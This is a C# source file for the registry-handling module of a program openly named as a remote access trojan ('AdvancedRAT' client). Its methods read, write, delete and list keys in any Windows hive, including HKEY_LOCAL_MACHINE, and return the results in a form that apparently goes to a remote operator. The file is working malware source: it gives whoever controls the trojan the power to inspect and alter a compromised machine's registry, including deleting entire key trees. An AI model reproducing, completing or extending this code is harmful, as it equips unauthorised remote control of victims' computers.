using System;
using System.Threading.Tasks;
using Microsoft.Win32;
using System.Collections.Generic;

namespace AdvancedRAT.Client.Handlers
{
    public class RegistryHandler
    {
        public async Task<object> ReadKey(string path)
        {
            try
            {
                string[] parts = path.Split('\\');
                string hive = parts[0];
                string subKey = string.Join("\\", parts, 1, parts.Length - 2);
                string valueName = parts[parts.Length - 1];
                
                RegistryKey baseKey = GetBaseKey(hive);
                
                using (RegistryKey key = baseKey.OpenSubKey(subKey))
                {
                    if (key != null)
                    {
                        object value = key.GetValue(valueName);
                        return new
                        {
                            success = true,
                            name = valueName,
                            value = value?.ToString(),
                            type = key.GetValueKind(valueName).ToString()
                        };
                    }
                }
                
                return new { success = false, message = "Key not found" };
            }
            catch (Exception ex)
            {
                return new { success = false, message = ex.Message };
            }
        }
        
        public async Task<object> WriteKey(string path, string name, object value)
        {
            try
            {
                string[] parts = path.Split('\\');
                string hive = parts[0];
                string subKey = string.Join("\\", parts, 1, parts.Length - 1);
                
                RegistryKey baseKey = GetBaseKey(hive);
                
                using (RegistryKey key = baseKey.CreateSubKey(subKey, true))
                {
                    key.SetValue(name, value);
                    return new { success = true, message = "Registry key written" };
                }
            }
            catch (Exception ex)
            {
                return new { success = false, message = ex.Message };
            }
        }
        
        public async Task<object> DeleteKey(string path)
        {
            try
            {
                string[] parts = path.Split('\\');
                string hive = parts[0];
                string subKey = string.Join("\\", parts, 1, parts.Length - 1);
                
                RegistryKey baseKey = GetBaseKey(hive);
                baseKey.DeleteSubKeyTree(subKey, false);
                
                return new { success = true, message = "Registry key deleted" };
            }
            catch (Exception ex)
            {
                return new { success = false, message = ex.Message };
            }
        }
        
        public async Task<object> ListKeys(string path)
        {
            try
            {
                string[] parts = path.Split('\\');
                string hive = parts[0];
                string subKey = string.Join("\\", parts, 1, parts.Length - 1);
                
                RegistryKey baseKey = GetBaseKey(hive);
                
                using (RegistryKey key = baseKey.OpenSubKey(subKey))
                {
                    if (key != null)
                    {
                        var subKeys = new List<string>(key.GetSubKeyNames());
                        var values = new List<object>();
                        
                        foreach (string valueName in key.GetValueNames())
                        {
                            values.Add(new
                            {
                                name = valueName,
                                value = key.GetValue(valueName)?.ToString(),
                                type = key.GetValueKind(valueName).ToString()
                            });
                        }
                        
                        return new { success = true, subKeys, values };
                    }
                }
                
                return new { success = false, message = "Key not found" };
            }
            catch (Exception ex)
            {
                return new { success = false, message = ex.Message };
            }
        }
        
        private RegistryKey GetBaseKey(string hive)
        {
            return hive.ToUpper() switch
            {
                "HKCU" or "HKEY_CURRENT_USER" => Registry.CurrentUser,
                "HKLM" or "HKEY_LOCAL_MACHINE" => Registry.LocalMachine,
                "HKCR" or "HKEY_CLASSES_ROOT" => Registry.ClassesRoot,
                "HKU" or "HKEY_USERS" => Registry.Users,
                "HKCC" or "HKEY_CURRENT_CONFIG" => Registry.CurrentConfig,
                _ => Registry.CurrentUser
            };
        }
    }
}
